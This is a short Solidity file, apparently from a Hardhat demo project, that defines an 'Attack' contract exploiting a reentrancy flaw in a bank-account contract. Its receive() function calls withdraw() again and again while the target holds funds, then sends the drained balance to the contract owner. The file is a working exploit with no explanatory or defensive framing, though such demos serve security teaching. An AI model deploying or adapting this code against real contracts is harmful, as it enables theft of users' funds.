// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "hardhat/console.sol";
interface InterfaceBankAccount {
  function deposit() external payable;
  function withdraw() external;
}

contract Attack  is Ownable {
  InterfaceBankAccount public immutable bankAccountSmartContractAddress;

  constructor(address _bankAccountSmartContractAddress) {
    bankAccountSmartContractAddress = InterfaceBankAccount(_bankAccountSmartContractAddress);
  }

  function attack() external payable onlyOwner {
    bankAccountSmartContractAddress.deposit{ value: msg.value }();
    bankAccountSmartContractAddress.withdraw();
  }

  receive() external payable {
    if (address(bankAccountSmartContractAddress).balance > 0) {
      // Reentrancy by calling again withdraw
      bankAccountSmartContractAddress.withdraw();
    } else {
      console.log("Transfering money...");
      payable(owner()).transfer(address(this).balance);
    }
  }
}
